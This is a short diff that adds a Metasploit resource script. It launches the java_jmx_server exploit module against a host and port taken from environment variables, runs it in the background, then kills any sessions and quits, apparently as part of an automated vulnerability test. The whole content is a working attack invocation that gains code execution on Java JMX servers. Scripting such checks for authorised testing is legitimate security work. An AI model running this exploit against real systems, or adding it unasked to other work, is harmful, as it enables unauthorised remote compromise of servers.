@@ -1,0 +1,10 @@
+use exploit/multi/misc/java_jmx_server
+<ruby>
+#Set the target host
+run_single("set RHOST #{ENV['IP_ADDR']}")
+#Set the target port number
+run_single("set RPORT #{ENV['PORT_NO']}")
+</ruby>
+exploit -z
+sessions -K
+quit
